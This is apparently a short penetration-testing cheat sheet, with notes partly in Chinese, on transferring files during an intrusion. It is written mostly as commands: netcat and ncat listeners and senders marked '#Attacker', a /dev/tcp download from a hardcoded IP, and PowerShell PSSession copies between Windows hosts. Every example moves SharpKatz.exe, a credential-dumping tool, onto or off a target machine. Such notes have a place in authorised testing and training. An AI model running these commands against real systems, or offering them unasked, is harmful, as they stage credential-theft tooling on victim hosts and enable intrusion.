# Original NetCat
```bash
#Inbound
nc -l -p 8000 > Sharpkatz.exe
nc -q 0  {RHOST}  8000 < SharpKatz.exe #Attacker

#Outbound
sudo nc -l -p 443 -q 0 < SharpKatz.exe #Attacker
nc {LHOST} 443 > SharpKatz.exe
```
# Ncat (Nmap Create)
```bash
#Inbound
 ncat -l -p 8000 --recv-only > SharpKatz.exe
 ncat --send-only {RHOST} 8000 < SharpKatz.exe #attacker

#Outbound
sudo ncat -l -p 443 --send-only < SharpKatz.exe
ncat {LHOST} 443 --recv-only > SharpKatz.exe
```

# /dev/tcp
```bash
# Outbound,upload;.'
sudo ncat -l -p 443 --send-only < SharpKatz.exe
sudo nc -l -p 443 -q 0 < SharpKatz.exe

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
# PSSession
通过WinRM进行发送，这在**windows主机之间发送文件**时，会用到！
它需要在远程主机上有**Administrator/RemoteManagerUser**的对应权限（或者是PSSession的显式权限）
```powershell
#check
Test-NetConnection -ComputerName <HOSTNAME> -Port 

# DC01 <-from- $Session -to-> DATABASE01
 $Session = New-PSSession -ComputerName DATABASE01
 Copy-Item -Path "C:\samplefile.txt -ToSession" $Session -Destination "C:\Users\Administrator\Desktop\" #upload
 Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination "C:\" -FromSession $Session #Download
```